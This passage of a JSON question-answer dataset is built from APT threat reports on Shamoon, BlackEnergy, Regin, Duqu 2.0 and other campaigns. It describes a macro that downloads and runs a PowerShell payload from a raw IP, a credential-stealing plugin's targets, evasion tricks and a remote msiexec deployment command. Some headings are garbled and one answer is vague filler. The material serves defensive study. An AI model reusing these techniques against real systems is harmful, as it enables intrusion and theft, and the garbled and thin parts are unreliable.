this execution is successful, it creates a buffer using VirtualAlloc and calls InternetReadFile in a loop until all the file contents are retrieved from hxxp://45.76.128.165:4443/0w0O6. This is then returned as a string to PowerShell, which calls invoke-expression (iex) on it, indicating that the expected payload is PowerShell.\nOf note, the macro contained a DownloadFile() function that would use URLDownloadToFileA, but this was never actually used.\nBased on observations associated with the malicious document, we observed subsequent shell sessions probably associated with Metasploit's (<https://www.offensive-security.com/metasploit-unleashed /meterpreter-basics/>)Meterpreter that enabled deployment of additional tools and malware preceding deployment of three Shamoon-related files: ntertmgr32.exe, ntertmgr64.exe and vdsk911.sys.\nBig Headline: Shamoon's Back, But for How Long This Time?\nAlthough the complete list of Shamoon's victims is not public, (<https://www.bloomberg.com/news/articles/2016-12-01/destructive-hacks-strike-saudi-arabia-posing-challenge-to-trump>)Bloomberg reported that in one case, thousands of computers were destroyed at the headquarters of Saudi's General Authority of Civil Aviation, erasing critical data and bringing operations to a halt for several days.\nThe recent activity X-Force IRIS is seeing from the Shamoon attackers has so far been detected in two waves, but those are likely to subside following the public attention the cases have garnered since late 2016.\nSaudi Arabia (<http://www.reuters.com/article/us-saudi-cyber-idUSKBN1571ZR>)released a warning to local organizations about the Shamoon malware, alerting about potential attacks and advising organizations to prepare. Analysis and warnings about Shamoon are resulting in preparation on the targets' end, and actors are likely to disappear and change their tactics until the next wave of attacks.\nFor technical details on this research and related indicators of compromise, see the (<https://exchange.xforce.ibmcloud.com/collection/Spear-Phishing-Attacks-Preceding-Shamoon-Malware-Breakouts-eeed4eede51b9a4587f4c7c816ad6e4e>)X-Force Advisory on X-Force Exchange.\n\nWhat specific methods did the attackers use to distribute the malicious documents, and how did they ensure the documents appeared legitimate to the targets?",
    "output": "The attackers distributed the malicious documents through spear phishing emails, often themed as resumes or human resources documents. They used URL-shortening schemes and hosted the documents on web servers to deliver them to their targets. To make the documents appear legitimate, the attackers used names like 'IT Worx' and 'MCI,' which are familiar to Saudi-based employees. These names were chosen to lure employees into opening the attachments without suspicion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Operation Molerats utilize XtremeRAT, and what specific indicators were used to track this activity?",
    "output": "In 2012, XtremeRAT was used in Operation Molerats against various governments as well as Israeli and Palestinian targets. One particular sample beaconed to 'test.cable-modem.org' and 'idf.blogsite.org'. The attacker used XtremeRAT 2.9 within a self-extracting archive that also presented a decoy document. The controller used the ID field to record the type of attack delivered (docx) and the Group field to record a 'campaign code' (IDF). The attacker modified the default password to '1411' and changed the default process mutex name to 'fdgdfdg'. These indicators, along with command and control domain names and IP addresses, were used to cluster and track this activity over time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What were the primary failures in the networked control and safety systems on the Deepwater Horizon that contributed to the catastrophe, and how might these have been exploited in a cyber-attack scenario?",
    "output": "The primary failures included the inhibition of gas alarms to prevent false alarms, intermittent freezing of monitoring and control systems, and the fire and alarm system being set to override active. These issues highlight that the control systems were not functioning optimally, which could have been exploited by a malicious actor to disable or manipulate critical safety features. For instance, an attacker could have ensured that alarms remained inhibited or control systems were frozen, preventing timely response to the blowout.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: \ue023\ue038\ue01e\ue023\ue031\ue053\ue04a\ue001\ue053\ue023\ue03d\ue038\nAll of the attacks we have observed occurred through document exploits attacking known vulnerabilities. We have seen RTF and XLS files used for delivery. Searching the internet for the author and document names yields information regarding South Asia politics. Although all of the document exploits we have analyzed drop a decoy document, most of them are either empty or filled with unreadable data with two exceptions.\nOne is an article about Pakistan's indigenous UAV industry which is attributed to author Aditi Malhotra, an Indian writer and Associate Fellow at the Centre for Land Warfare Studies (CLAWS) in New Delhi. Although we are not sure this particular work is actually hers, we did find a reference to a similarly named article \"Pakistan's UAV programme: Ambitious, with some friendly help.\" Unfortunately, this document was not available. Other works of hers on a similar note include \"India's Silence on Chinese Incursions\" and \"China and Pakistan: Dangerous Liaisons.\"\nThe other decoy document is contact info for an American with a military provided email address from Joint Base Andrews in Maryland, but with a physical address in Pakistan titled \"Family Planning Association of Base (FPAB).\" It looks like they took the \"Family Planning Association of Bangladesh\" and combined it with \"Joint Base Andrews.\" The title of the email field is \"FPAP Email\", \"FPAP\" could stand for \"Family Planning Association of Pakistan.\" Ultimately, we could make no sense from this information.\nBig Headline: \ue053\ue022\ue015\ue03b\ue037\ue057\ue053\ue053\ue015\ue04a\ue03b \ue001 \ue02f\ue011\ue03d\ue03d\ue04a\nTwo different versions of the same backdoor were used in all of these attacks. In every case we have found, the main component is a DLL dropped by an executable compiled minutes after the DLL. The dropper shares the same decoding functions as the DLL and performs some modifications on the DLL that will be described later. There was one unique case we found where the initial dropper was a self\u00adextracting archive that utilizes Visual Basic and batch scripts to download and install the DLL instead of extracting it from a resource.\nMutter is HTTP proxy aware, and attempts to determine if a proxy is required and what the proxy details are if necessary. It uses google.co.in to perform such tests. It uses HTTP to communicate with the C&C server and\nexpects an encoded string between a pair of <p> tags in the response. The URL in the request has one parameter, \"i\", which is set to an encoded representation of a string that follows this format:\nWe are not certain about the second part of this string, it may be either a campaign marker or an extension of the version number. In all our cases, it is set to either \"SN0\" or \"SN1.\" Actual strings are shared in the appendix information at the end of this blog.\nThis HTTP request pictured in the screenshot is from the older version of Mutter. The newer versions of Mutter have a very similar HTTP request, but with the Host and Connection headers swapped.\nThe response string is decoded and parsed for the following commands:\n\"m\": executes a shell command\n\"u\": uploads a file to the victim (downloads a file from the victim's perspective)\n\"d\": downloads a file to the attacker (uploads a file from the victim's perspective)\n\"R\": removes the auto\u00adrun registry value\nThese commands are referenced in the code in this order, and when said aloud it sounds like \"mutter\", hence the name chosen for the malware. In the earlier version of this backdoor, the \"d\" command was referenced, but the code had not been implemented yet. In both versions, another command string \"f\" appears along with the others, but is not referenced in the code. This perhaps indicates a future feature to be added.\nThis malware employs several interesting evasion techniques. For starters, it employs several \"hide in plain sight\" techniques common to malware used in targeted attacks. It specifies fake properties, pretending to be Google or Microsoft.\nThis brings us to the next \"hide in plain sight\" tactic we noticed. Observe the size of the file above. It's a whopping 41 megabytes. With rare exception, malware typically have a small size usually no larger than a few hundred kilobytes. When an investigator comes across a file megabytes in size, he may be discouraged from taking a closer look. Interestingly, the original size of this particular DLL is around 160 kilobytes, although the PE headers already indicate its future size as shown below. The dropper will decode this DLL from its resource section, drop it onto the victim's system, and proceed to fill its resource section with randomly generated data. This has another useful side effect of giving each DLL a unique hash, making it more difficult to identify.\nIn addition to these hiding techniques, this malware also appears to employ techniques to possibly evade dynamic malware analysis systems. This has been an ongoing trend in malware development that we and others have observed several times in past. The malware author will add code to delay the execution of the important functionality for some period of time with the idea being that if the malware stalls for long enough, the dynamic malware analysis system will give up on it and pass it off as benign. This malware has two routines that we could find no other purpose than for such an evasion.\nOne routine is a function that simply runs a series of loops, incrementing a local variable over and over, thousands of times. It ultimately disregards the final value of this variable, meaning that the function serves no purpose. This function is called many times throughout the rest of the code. It may have been implemented for the purpose of wasting time.\nAnother routine seems to have a similar goal, but with a different approach. This time, a loop is implemented with a call to sleep for a short time. This loop occurs many times, and each time it will also allocate a chunk of memory on the heap, performing math operations on it and printing it to the console over and over again. Keep in mind that this memory is not initialized to any value and is not used for anything later in the code, it is essentially junk memory. This seems to be another means of wasting time.\nWe detect this malware as Backdoor.APT.NS01.\nBig Headline: \ue05d \ue03b\ue011\ue015\ue053\ue001\ue023\ue031\ue04e\nMost of the domains registered for C&C use in this campaign were done so through the free dynamic DNS Provider ChangeIP.com. Dynamic DNS is a popular option for domain registration since it is free and provides a convenient level of anonymity. Looking at passive DNS records for other domains pointing to the IP addresses used to host the C&C services turned up many other related domains. Various subdomains of the domain winsupdate.com have pointed to several IPs pointed to by the Mutter domains. This is interesting because this is the name of the folder created by Mutter on victims' systems. Furthermore, this domain is not a publicly available dynamic DNS provider and the email address used to register this domain is binalakshminp@yahoo.com . We cannot be certain, but this name could be in reference to Binalakshmi Nepram, a writer\u00adactivist born in Manipur India who is fighting for disarmament. This fits the theme we have observed from other clues left behind in decoy documents. Another domain that is indirectly linked is agfire.com with this interesting registration information.\nAgni is the Hindu god of fire. Notice the combination of India and China references here. The email address used to register this domain was also referenced in a Chinese developer forum, but nothing else interesting was discovered about it.\nThe IP addresses hosting the C&C services are scattered all over the world and are believed to be compromised hosts.\nBig Headline: \ue001\ue053\ue053\ue001 \ue02f\ue015\ue04a\ue04e\ue019\ue03b\ue053\ue001\ue04a\ue01f\ue015\ue053\ue04e\ue019\ue03b\ue001\ue038\ue011\ue03b\ue053\ue023\ue037\ue015\ue031\ue023\ue038\ue015\nThe theme of these attacks appears to be South Asia politics. The hints scattered throughout the documents and domain registrant information were laid on pretty thick which is something be wary of. The only legible, sensible decoy document observed so far is revealing of the interests of at least one of the targets of this campaign: namely the military threat of Pakistan against India and its growing relationships with other countries including China. The particular topic of this decoy document also appears to be a common link between most of the targets we have seen: unmanned vehicles.\nThe timeline below outlines the events specific to Mutter that we had visibility into. This campaign is still ongoing with Mutter callbacks being made to this day.\n\nAnswer this question based on the above context: How does the Mutter backdoor utilize dynamic DNS providers for its C&C infrastructure and what additional insights can be gained from the domain registration information?",
    "output": "The Mutter backdoor uses domains registered through the free dynamic DNS provider ChangeIP.com for its C&C infrastructure, leveraging the convenience and anonymity offered by dynamic DNS. Passive DNS records reveal related domains, such as subdomains of winsupdate.com, which match the folder created by Mutter on victims' systems. The domain agfire.com, indirectly linked to the campaign, has registration information combining India and China references, with the email address used in a Chinese developer forum. This information aligns with the South Asia politics theme observed in the decoy documents.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Explain the purpose and methodology of the DOCS_STEALER module in Operation Groundbait. What types of files does it collect and how are they processed?",
    "output": "The DOCS_STEALER module is responsible for collecting documents from removable media or fixed drives connected via a USB interface. It focuses on collecting files with document-type extensions such as .DOC, .XLS, .DOCX, .XLSX, .PPT, .PPTX, .PPS, .PPSX, .PDF, .RTF, .TXT, and .ODT. The module only collects files that were modified in the last 7, 14, or 30 days, depending on the version. The collected files are then compressed, encrypted with Blowfish, and stored under the scheme %USERPROFILE%\\\\AppData\\\\Local\\\\ioctl\\\\%DISK_ID%\\\\%DATE%_%TIME%.kf.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key differences between the old and new versions of the IsSpace malware used by DragonOK, and what techniques are employed in the updated version?",
    "output": "The new version of the IsSpace malware used by DragonOK has undergone several updates. While the available commands from the command and control (C2) server remain the same, the URI structure of the network communication has been modified. Additionally, the installation routine for this malware family has been updated to be far less complex than previous versions. The new version favors PowerShell to set persistence and forgoes the previously used side-loading technique. This streamlined approach makes the malware more efficient and harder to detect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the net_dll component of APT-C-36 achieve persistence and load the next stage of payload execution? Explain the process in detail.",
    "output": "The net_dll component of APT-C-36 achieves persistence and loads the next stage of payload execution through several steps. First, a Powershell script decrypts the net_dll payload data by downloading it from a third-party platform and calls the CdWDdB.DKeSvl.NnIaUq method to implement reflective loading. After net_dll is run, a vbs and ps1 script are created in the %TEMP% folder of the computer for persistence. Scheduled tasks are then created for persistence. The process continues by downloading the next-stage payload encoding data from the third-party platform, reversing the encoded data, replacing special characters, and base64 decoding the encoded data to obtain the next-stage payload. The processed net_dll payload data is loaded reflectively by calling its KoAOkX.MXuuJb.WwQTZc method. In the second stage, after net_dll is run, the AsyncRAT Trojan is injected into the system process to run.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Trident Ursa APT group utilize Windows Management Instrumentation (WMI) in their malware campaign to establish communication with their Command and Control (C2) server?",
    "output": "Windows Management Instrumentation (WMI) is a powerful administration feature in Windows systems that provides a uniform environment to access system components. Adversaries, including the Trident Ursa APT group, can abuse WMI to execute malicious commands and payloads. In the case of Trident Ursa, they utilize WMI to determine the IP address of their C2 server. Specifically, they use a WMI query to ping a domain with a random number and check the ProtocolAddress value to obtain the C2 IP address. This is done as part of their VBScript code, which is responsible for establishing communication with the C2 server and executing additional malicious code. By leveraging WMI in this way, Trident Ursa is able to dynamically obtain the C2 IP address and maintain communication with their server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Central Hosting of Clean Content\nMost RTB ad providers allow for advertisers to host their own ad content. This allows advertisers to directly collect web impression data of who is hitting which ads, from where, by which IPs, which user-agent strings, and just about anything else you could log about a website visit. In addition, the advertising network doesn't have to utilize their own disk space to host the image files, the flash videos or other online content. RTB networks simply do the auctioneering and redirection to the winning content.\nIt is this weakness in security that malvertisers are taking advantage of.  If ad networks were to switch to a model where all content is actually hosted by them (1st party hosting), in a cloud, then the risk of malvertising would drop dramatically.\nThe has a Seller's Cloud, which could be a security model for the RTB industry. It is inherently more secure way of hosting ad content.\nBig Headline: How to Protect Yourself  from Micro-targeted Malvertising\nOperation DeathClick is an active campaign to micro-target companies via malvertising in order to compromise their networks. Unfortunately, the micro-targeting malvertising technique evades almost all network controls and traditional endpoint anti-virus solutions. Invincea can protect users from this attack type among other targeted and opportunistic web-based threats. For half the price of a candy bar, attackers have the unprecedented ability to deliver malware to you through your web browser simply because of your IP address space and your industry vertical. Most of the attacks featured here were not detected by standard Anti-Virus because the malware hashes constantly change.\nWeb proxy blocking updates, even in real time, will not stop new malvertising landing pages that appear and disappear within minutes.\nIntelligence feeds from the premier intelligence providers, based on hostname, IP, URL or domain will not be able to block malicious malvertisers quickly enough.\nInvincea protected users can simply browse and click anything online without fear of compromise or targeted malvertising attacks.\nNon-Invincea users can attempt to OptOut of directed targeting where you can. European privacy laws for forcing most ad providers to offer the opt-out service; however, you often have to visit each ad provider individually to choose to opt out.\nNote, that opting out merely places a blocking cookie in your browser. This means that ad providers will not target or retarget based on cookies. But as shown above, the new targeted advertising is via IP intelligence.\n\nQ: Why are traditional network controls and endpoint anti-virus solutions ineffective against micro-targeted malvertising campaigns like Operation DeathClick? What alternative measures can be taken to protect users from such attacks?",
    "output": "A: Traditional network controls and endpoint anti-virus solutions are ineffective against micro-targeted malvertising campaigns like Operation DeathClick due to several reasons. Firstly, these campaigns evade detection by constantly changing malware hashes, rendering signature-based detection methods obsolete. Secondly, the short lifespan of malvertising landing pages, which appear and disappear within minutes, makes it challenging for web proxy blocking updates to keep up. Additionally, intelligence feeds based on hostname, IP, URL, or domain cannot block malicious malvertisers quickly enough. To protect users from such attacks, solutions like Invincea can be employed, which allow users to browse and click anything online without fear of compromise. Non-Invincea users can attempt to opt out of directed targeting, although this approach has limitations, as it primarily relies on cookies and does not address IP-based targeting.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nOperation Groundbait (Russian: \u041f\u0440\u0438\u043a\u043e\u0440\u043c\u043a\u0430, Prikormka) is an ongoing cyber-surveillance operation targeting individuals in Ukraine. The group behind this operation has been launching targeted and possibly politically-motivated attacks to spy on individuals.\nThis paper presents ESET's findings about Operation Groundbait based on our research into the Prikormka malware family. This includes detailed technical analysis of the Prikormka malware family and its spreading mechanisms, and a description of the most noteworthy attack campaigns.\n\nHow does the Prikormka malware family, associated with Operation Groundbait, facilitate cyber-surveillance operations against targets in Ukraine? Describe the technical aspects and spreading mechanisms involved.",
    "output": "The Prikormka malware family facilitates cyber-surveillance operations by targeting individuals in Ukraine through targeted and possibly politically-motivated attacks. The malware is designed to spy on these individuals. The technical analysis of the Prikormka malware family reveals its detailed capabilities and how it operates. Additionally, the spreading mechanisms employed by the group behind Operation Groundbait are crucial for understanding how the malware reaches its intended targets. These mechanisms involve various techniques that allow the malware to propagate effectively among the targeted population.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the structure and purpose of the Virtual File Systems (VFSes) used by the Regin malware, and how are the files within these systems encrypted and compressed?",
    "output": "The Virtual File Systems (VFSes) in the Regin platform store the most interesting code and have a structure similar to a real disk file system like FAT. Each VFS begins with a header that provides basic information needed to operate the file system, followed by a bitmap of used/free sectors and a file table. Files are described by file table entries, and each sector starts with a 32-bit integer indicating the offset of the next sector of the file. The file entries are encrypted using the RC5 algorithm, and many records are also compressed using the nrv2e algorithm from the UCL library. The UCL library is an open-source implementation of the NRV compression algorithm, chosen for its compactness and minimal memory requirements. Each VFS is encrypted with a 16-byte key, which can vary from victim to victim. Most files, however, are encrypted with the same key, {73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}, stored in the dispatcher module or VMEM.sys kernel core.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Overview of the Malicious Emails\nIn the first wave of attack, The attackers sent out spear-phishing emails containing malicious excel file (Case Detail of Suspected abuser.xls) to an unit of Central Bureau of Investigation (CBI) on February 21st, 2017 and the email was sent from an email id associated with an impersonating domain idsadesk[.]in. To lure the victims to open the malicious attachment the email subject relevant to the victims were chosen and to avoid suspicion the email was made to look like it was sent by a person associated with IDSA asking to take action against a pending case as shown in the screen shot below.\nIn the second wave of attack, a spear-phishing email containing a different malicious excel file (Contact List of attendees.xls) was sent to an email id on the same day February 21st, 2017. The email was made to look like a person associated with IDSA is asking to confirm the phone number of an attendee in the attendee list. When the victim opens the attached excel file it drops the malware and displays a decoy excel sheet containing the list of names, which seems be the names of senior army officers. Even though the identity of the recipient email could not be fully verified as this email id is nowhere available on the internet but based on the format of the recipient email id and from the list of attendees that is displayed to the victim in the decoy excel file, the recipient email could be possibly be associated with either the Indian Army or a Government entity. This suggests that attackers had prior knowledge of the recipient email id through other means.\nIn both the cases when the victims opens the attached malicious excel file the same malware sample was dropped and executed on the victim's system. From the emails (and the attachments) it looks like the goal of the attackers was to infect and take control of the systems and to spy on the victims.\n\nQ: In the context of the APT attack impersonating an Indian Think Tank to target the Central Bureau of Investigation (CBI), how did the attackers use social engineering techniques to increase the likelihood of victims opening the malicious Excel files?",
    "output": "A: The attackers employed several social engineering techniques to enhance the credibility of their phishing emails and increase the likelihood of victims opening the malicious Excel files. Firstly, they chose email subjects that were relevant to the victims, making the emails appear legitimate and urgent. Secondly, they impersonated a known entity, the Institute for Defence Studies and Analyses (IDSA), by using a spoofed email domain (idsadesk[.]in) and crafting the content to seem as if it came from a person associated with IDSA. Additionally, the emails contained requests that would naturally prompt the recipients to open the attachments, such as asking to take action against a pending case or confirming the phone number of an attendee in the attendee list. These tactics were designed to lower the victims' suspicions and encourage them to interact with the malicious content.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: DRIVER COMPONENT\nThe only component that will remain permanently on the infected system will be the driver component. The driver component used by the gang is a stripped down version of the BlackEnergy 2 driver.\nThe sole purpose of this driver component is to inject the main DLL component into svchost.exe. Interestingly, it does not contain the rootkit functionalities for hiding processes, files and registry objects that is found in the usual BlackEnergy 2 drivers. The gang may have opted for a 'hide in plain sight' approach to evade detections from rootkit scanners, such as GMER and RootkitRevealer, that checks for system anomalies.\nThe driver component provides a IOCTL interface to communicate with the main DLL component. Table 1 (above) summarizes the command codes that can be passed to the IOCTL buffer. The 32-bit version contains additional, incomplete routines for hiding processes via direct kernel object manipulation (DKOM) and managing BlackEnergy 2 rootkit rules in memory [2] .\nMedium Headline: MAIN DLL COMPONENT\nThe core functionality of BlackEnergy 2 is found in the  main DLL component. This component is embedded inside the driver component and is not found in the file system; this is to reduce the infection footprint on the system.\nThe main DLL provides a robust framework for attackers to maintain a botnet that is not tied to any specific functionality. The malware is designed to be used by loading customized plugins depending on the purpose of the botmaster. It is mainly a framework for plugins to communicate with a central command and control. Otherwise, the main DLL only provides a minimal set of commands. Table 3 (above) summarizes the commands supported by the variants used in the attack against Ukrainian government organizations.\nIn BlackEnergy 2, the main DLL component communicates with its plugins via a defined set of API calls. It exports a number of function calls, which can be used by the plugins. On the other hand, plugins are required to export 2 functions to work. We highly recommend the research of Dell SecureWorks for those looking for more details regarding the BlackEnergy 2 plugin framework.\nMedium Headline: INFORMATION-STEALING PLUGIN\nSince the main DLL component offers little clue as to what the malware was used for, we need to look at the plugin to determine the objective of the gang.\nOne particular plugin that was used in the campaign was called \"si\", perhaps to mean 'steal information'. The latest sample we found will attempt to gather the following information and send them to the C&C server:\n\u2022 System configuration information (gathered via systeminfo.exe)\n\u2022 Operating system version\n\u2022 Privileges\n\u2022 Current time\n\u2022 Up time\n\u2022 Idle Time\n\u2022 Proxy\n\u2022 Installed apps (gathered from uninstall program registry)\n\u2022 Process list (gathered via tasklist.exe)\n\u2022 IP configurations (gathered via ipconfig.exe)\n\u2022 Network connections (gathered via netstat.exe)\n\u2022 Routing tables (gathered via route.exe)\n\u2022 Traceroute and Ping information to Google (gathered via tracert.exe and ping.exe)\n\u2022 Registered mail, browser, and instant messaging clients (gathered via client registry)\n\u2022 Account and password information from The Bat! email client (gathered from account.cfn and account.cfg)\n\u2022 Stored username and passwords in Mozilla password manager of the following applications (gathered from signons*.txt and signons.sqlite)\n\u2022 Thunderbird\n\u2022 Firefox\n\u2022 SeaMonkey\n\u2022 IceDragon\n\u2022 Stored username and passwords in Google Chrome password manager of the following applications (gathered from \"Login Data\")\n\u2022 Google Chrome\n\u2022 Chromium\n\u2022 Comodo Dragon\n\u2022 Xpom\n\u2022 Nichrome\n\u2022 QIP Surf\n\u2022 Torch\n\u2022 YandexBrowser\n\u2022 Opera\n\u2022 Sleipnir\n\u2022 Account and password information from Outlook and Outlook Express\n\u2022 Internet Explorer version and stored username and passwords\n\u2022 Stored username and passwords in Windows Credential Store\n\u2022 Live\n\u2022 Remote Desktop\n\u2022 Other generic credentials (Microsoft_ WinInet_*)\nThe nature of the information being gathered seems to be generic rather than targeted. This may be because the malware has roots from crimeware. The information is still useful however as such data makes it easier for the gang to plan any further attacks on the same targets.\nMedium Headline: NETWORK TRAFFIC\nBlackEnergy communicates with its C&C server via HTTP POST requests. For the BlackEnergy 2 samples used by the gang, the request contains the following fields:\nid=[bot_id]&bid=[base64_encoded_build_ id]&dv=[x]&mv=[y]&dpv=[z]\nWhere:\n\u2022 bot_id is equivalent to the infected host name and the volume serial number following the format x[host_name]_[serial_no] (e.g. xJOEPC_484DA98A)\n\u2022 build_id is the string found in the build_id field in the sample's configuration data\n\u2022 x, y, z are hardcoded values which varies among samples\nThe fields are almost the same for BlackEnergy 3 samples:\nid=[bot_id_sha1]&bid=[base64_encoded_build_ id]&nm=[x]&cn=[y]&num=[z]\nThe only major difference is that the id field contain just the hash instead of the actual string. The actual bot_id string in which the id hash is derived is also a bit different; it now uses the format [domain_sid]_[host_name]_ [serial_no].\nThe response of the command and control server will be encrypted using the id field in the POST request as the key. After the response is decrypted, it will be in the form of the corresponding configuration data of the BlackEnergy sample; for example, BlackEnergy 2 samples expect the decrypted response to be a XML document, while BlackEnergy 3 samples expect the decrypted response to be a series X509_ASN encoded values.\nThe decrypted response, which is equivalent to another configuration data, will be processed similar to the initial configuration data embedded in the main DLL; the only differences are the data fields that are processed. This cycle is illustrated in diagram 3 (above).\nThe main DLL also uses the fields listed in table 6 (above) when it needs to download additional files.\nBig Headline: CONCLUSIONS\nBlackEnergy is a toolkit that has been used for years by various criminal outfits. In the summer of 2014, we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting. These samples were identified as being the work of one group, referred to in this document as \"Quedagh\", which has a history of targeting political organizations. Though inconclusive, suggestive details indicate that BlackEnergy malware, possibly also from this gang, may also have been used in the Russo-Georgian confrontation in 2008.\nThe Quedagh-customizations to the BlackEnergy malware include support for proxy servers (which, in the samples examined are associated with Ukrainian entities) and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems. While monitoring BlackEnergy samples, we also encountered a new variant, which we dub BlackEnergy 3, with a modified configuration, no driver component and a different installation procedure.\nThe use of BlackEnergy for a politically-oriented attack is an intriguing convergence of criminal activity and espionage. As the kit is being used by multiple groups, it provides a greater measure of plausible deniability than is afforded by a custom-made piece of code.\nMedium Headline: .REFERENCES\n1. Wikipedia; Proxy server; http://en.wikipedia.org/wiki/Proxy_server#Cross-domain_resources\n2. Broderick Aquilino; F-Secure Weblog; BlackEnergy Rootkit, Sort Of; 13 June 2014; http://www.f-secure.com/weblog/archives/00002715.html\n3. Broderick Aquilino; F-Secure Weblog; Beware BlackEnergy If Involved In Europe/Ukraine Diplomacy; 30 June 2014;  http://www.f-secure.com/weblog/archives/00002721.html\n4. Kafeine; Malware don't need Coffee; BotnetKernel (MS:Win32/Phdet.S) an evolution of BlackEnergy ; 21 June 2014; http://malware.dontneedcoffee.com/2014/06/botnetkernel.html\n5. Joe Stewart; DELL SecureWorks; BlackEnergy Version 2 Analysis; 3 March 2010;  http://www.secureworks.com/cyber-threat-intelligence/threats/blackenergy2/\nBig Headline: SWITCH ON FREEDOM\nF-Secure is an online security and privacy company from Finland. We offer millions of people around the globe the power to surf invisibly F-Secure is an online security and privacy company from Finland. and store and share stuff, safe from online threats.We offer millions of people around the globe the power to surf invisibly and store and share stuff, safe from online threats.\nWe are here to fight for digital freedom.\nWe are here to fight for digital freedom.\nJoin the movement and switch on freedom.\nJoin the movement and switch on freedom.\nFounded in 1988, F-Secure is listed on NASDAQ OMX Helsinki Ltd. Founded in 1988, F-Secure is listed on NASDAQ OMX Helsinki Ltd.\nAnswer this question: Why did the Quedagh group choose to strip down the rootkit functionalities from the BlackEnergy 2 driver component? What implications does this have on detection mechanisms?",
    "output": "The Quedagh group chose to strip down the rootkit functionalities from the BlackEnergy 2 driver component to adopt a 'hide in plain sight' approach. This strategy helps evade detections from rootkit scanners, such as GMER and RootkitRevealer, that check for system anomalies. By avoiding traditional rootkit behaviors, the malware becomes less conspicuous and harder to detect through conventional means.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: BEHIND THE TERRACOTTA NODES\nWhere do the various Terracotta VPN providers obtain the resources to build such a vast VPN network? Out of 1500+ common VPN nodes, it is possible that some servers or appliances were legitimately obtained and leased by the Terracotta VPN operators. We will describe how others were clearly compromised.  RSA Research proposes three possible candidates (three devices) encompassing 557 IP addresses. We believe these devices are the best possible candidates for legitimate lease by the Terracotta VPN perpetrators for the following reasons:\n1. Massive multi-homing: The minimum quantity of IP addresses per suspected-legitimately-leased-device is 51. Terracotta services are marketed as very cost-effective, offering availability of a large VPN network for approximately $3/month. Massive multi-homing of a single device is apparently a method for inflating the appearance of the network. A Terracotta VPN client pings and displays all available nodes, noting both the date each node came online and its current response-time. However, while the network may appear to offer multiple new nodes on a given day, nodes with the same enlistment date and similar response-times actually indicate a multi-homed device. Further, network analysis shows the VPN clients usually connect to only a single IP address assigned to each massively multi-homed device. This may result in lower maintenance overhead, and indicates that the Terracotta VPN operator knows full-well that there is just one device behind the large pool of available nodes. And while there is no performance benefit from having the VPN clients ping multiple IP addresses from the same devices, doing so perpetuates the illusion of a larger network than what exists. When connecting to each of the nodes depicted in the client UI below (several nodes reflecting one of three multi-homed devices RSA Research has identified) the exit IP addresses are randomly assigned from the large pool of available IP addresses.\n2. No public services other than PPTP VPN.  In instances where RSA Research has confirmed the compromise of an organization, the victim organizations used their Internet-facing servers for various use cases, none of which included VPN or Windows Remote Access services. If these were compromised devices, we would expect the devices to be used by their legitimate owners for other purposes prior to being enlisted as Terracotta VPN nodes.  If, on the other hand, a legitimate VPN provider was compromised, we expect the operators to have noticed that their authentication process and client-base had been hijacked.\nA login splash screen (Figure 3) associated with the device with hostname 3819027EEA6E42F indicates the use of Windows Server 2003 Enterprise x64 Server, with Simplified Chinese locale or Chinese language pack. The latter would be the Windows locale most-commonly used by mainland PRC or Singapore residents.\nQuestion: What characteristics distinguish legitimately leased devices from compromised ones in the Terracotta VPN network, and how can these distinctions aid in identifying and mitigating such threats?",
    "output": "Answer: Legitimately leased devices in the Terracotta VPN network are characterized by massive multi-homing, where a single device is assigned a large number of IP addresses to give the impression of a larger network. Additionally, these devices typically offer no public services other than PPTP VPN, which is unusual for compromised devices that would normally be used for various purposes by their legitimate owners. Compromised devices, on the other hand, often show signs of being used for other services before being enlisted as VPN nodes. Understanding these distinctions helps cybersecurity professionals identify potentially compromised devices within their networks. By monitoring for unusual VPN activity and checking for the presence of other public services, security teams can better detect and respond to unauthorized use of their resources, thereby mitigating the risks associated with such compromises.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: LATERAL MOVEMENT\nIn general, once the attackers gain access into a network, two phases follow:\n\u2022 Reconnaissance and identification of network topology\n\u2022 Lateral movement\nIn the case of Duqu 2.0, the lateral movement technique appears to have taken advantage of another zero-day, (CVE-2014-6324) which was patched in November 2014 with 5MS14-068 . This exploit allows an unprivileged domain user to elevate credentials to a domain administrator account. Although we couldn't retrieve a copy of this exploit, the logged events match the Microsoft detection guidance for this attack. Malicious modules were also observed performing a \"pass the hash\" attack inside the local network, effectively giving the attackers many different ways to do lateral movement.\nOnce the attackers gained domain administrator privileges, they can use these permissions to infect other computers in the domain.\nTo infect other computers in the domain, the attackers use few different strategies. In most of the attacks we monitored, they prepare Microsoft Windows Installer Packages (MSI) and then deploy them remotely to other machines. To launch them, the attackers create a service on the target machine with the following command line:\nmsiexec.exe /i \"C:\\\\[\u2026]\\tmp8585e3d6.tmp\" /q PROP=9c3c7076-d79f-4c\n4\n5\nThe PROP value above is set to a random 56-bit encryption key that is required to decrypt the main payload from the package. Other known names for this parameter observed in the attacks are \"HASHVA\" and \"CKEY\". The folder where the package is deployed can be different from case to case, depending on what the attackers can access on the remote machine.\nIn addition to creating 